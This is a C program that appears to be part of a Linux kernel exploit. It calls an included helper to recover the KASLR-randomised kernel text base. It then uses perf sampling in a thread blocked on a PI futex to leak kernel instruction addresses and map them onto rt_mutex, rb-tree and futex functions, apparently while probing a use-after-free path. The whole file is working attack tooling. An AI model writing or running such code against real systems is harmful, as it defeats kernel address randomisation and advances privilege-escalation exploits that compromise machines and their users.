/* piC.c — perf inside the BLOCKING worker thread (that's where rt_mutex_slowlock,
 * task_blocks_on_rt_mutex, adjust_prio_chain, rb_* run). Main holds the lock.
 * IP-only samples (small records), alarm guard, always unlock. No UAF. */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <stdlib.h>
#include <signal.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <linux/perf_event.h>
#include "kaaslr.h"
#ifndef __NR_perf_event_open
#define __NR_perf_event_open 241
#endif
#define RP 32
#define MAXO 600000
static uint64_t offs[MAXO]; static volatile int no=0;
static volatile int fut=0, stop=0, ready=0;
static inline long xf(void*u,int op){ return syscall(98,u,op,0,0,0,0); }
#define FLPI (6|128)
#define FUPI (7|128)
static uint64_t kt;
static void alrm(int s){(void)s;stop=1;}

static void drain(void*base,size_t pg,size_t ds,struct perf_event_mmap_page*meta){
    char*d=(char*)base+pg; __sync_synchronize();
    uint64_t head=meta->data_head;
    while(meta->data_tail<head){
        struct perf_event_header*h=(void*)(d+(meta->data_tail%ds));
        if(h->size<sizeof(*h)){meta->data_tail=head;break;}
        if(h->type==PERF_RECORD_SAMPLE){
            char*q=(char*)h+sizeof(*h);
            uint64_t ip; memcpy(&ip,q,8);
            if(ip>=0xffff000000000000UL && no<MAXO) offs[no++]=ip-kt;
        }
        meta->data_tail+=h->size;
    }
}
/* worker: blocks on LOCK_PI, with its own perf event */
static void* blocker(void*x){
    (void)x;
    struct perf_event_attr a; memset(&a,0,sizeof(a));
    a.type=PERF_TYPE_HARDWARE; a.size=sizeof(a); a.config=PERF_COUNT_HW_INSTRUCTIONS;
    a.sample_type=PERF_SAMPLE_IP; a.sample_period=500;
    a.disabled=0; a.exclude_kernel=0; a.exclude_hv=1; a.wakeup_events=1;
    int fd=(int)syscall(__NR_perf_event_open,&a,0,-1,-1,0);
    if(fd<0){ printf("[W] perf %d\n",errno); return 0; }
    size_t pg=sysconf(_SC_PAGESIZE), ds=RP*pg;
    void*base=mmap(NULL,ds+pg,PROT_READ|PROT_WRITE,MAP_SHARED,fd,0);
    if(base==MAP_FAILED){ printf("[W] mmap %d\n",errno); close(fd); return 0; }
    struct perf_event_mmap_page*meta=base;
    printf("[W] perf ok, blocking\n");
    while(!stop){
        xf(&fut,FLPI);            /* blocks until main unlocks */
        xf(&fut,FUPI);
        drain(base,pg,ds,meta);
    }
    drain(base,pg,ds,meta);
    munmap(base,ds+pg); close(fd);
    printf("[W] done\n");
    return 0;
}
int main(void){
    setvbuf(stdout,NULL,_IONBF,0);
    signal(SIGALRM,alrm); alarm(50);
    kt=kaaslr_text_base(); for(int r=0;r<6&&!kt;r++) kt=kaaslr_text_base();
    printf("[M] _text=%#018llx\n",(unsigned long long)kt); if(!kt)return 1;
    pthread_t w; pthread_create(&w,0,blocker,0);
    usleep(30000);
    printf("[M] hold/unlock loop\n");
    for(int i=0;i<3000 && !stop;i++){
        xf(&fut,FLPI);        /* main takes */
        usleep(600);          /* blocker queues -> enqueue_pi/rb_insert */
        xf(&fut,FUPI);        /* release -> dequeue/rb_erase/adjust_chain */
        usleep(600);
    }
    stop=1;
    pthread_join(w,0);
    printf("[M] offsets=%d\n",(int)no);
    struct{long lo,hi;const char*nm;}R[]={
        {0x9f153c,0x9f153c+0x400,"rb_insert_color"},
        {0x9f16ac,0x9f16ac+0x400,"rb_erase"},
        {0x14f7d0c,0x14f7d0c+0x200,"remove_waiter"},
        {0x14f81f4,0x14f81f4+0x600,"rt_mutex_adjust_prio_chain"},
        {0x14f71cc,0x14f7d0c,"rt_mutex_slowlock"},
        {0x14f73e4,0x14f7d0c,"task_blocks_on_rt_mutex"},
        {0x14f6d8c,0x14f71cc,"try_to_take_rt_mutex"},
        {0x27a8fc,0x27b600,"futex_lock_pi"},
        {0x277038,0x279200,"do_futex"},
    };
    for(unsigned r=0;r<sizeof(R)/sizeof(R[0]);r++){
        int c=0;uint64_t mn=~0ull,mx=0;
        for(int i=0;i<no;i++)if((long)offs[i]>=R[r].lo&&(long)offs[i]<R[r].hi){c++;if(offs[i]<mn)mn=offs[i];if(offs[i]>mx)mx=offs[i];}
        printf("HIT %-30s count=%-6d",R[r].nm,c);
        if(c)printf(" first=%#lx (+%#lx) last=%#lx",(unsigned long)mn,(unsigned long)(mn-R[r].lo),(unsigned long)mx);
        printf("\n");
    }
    return 0;
}
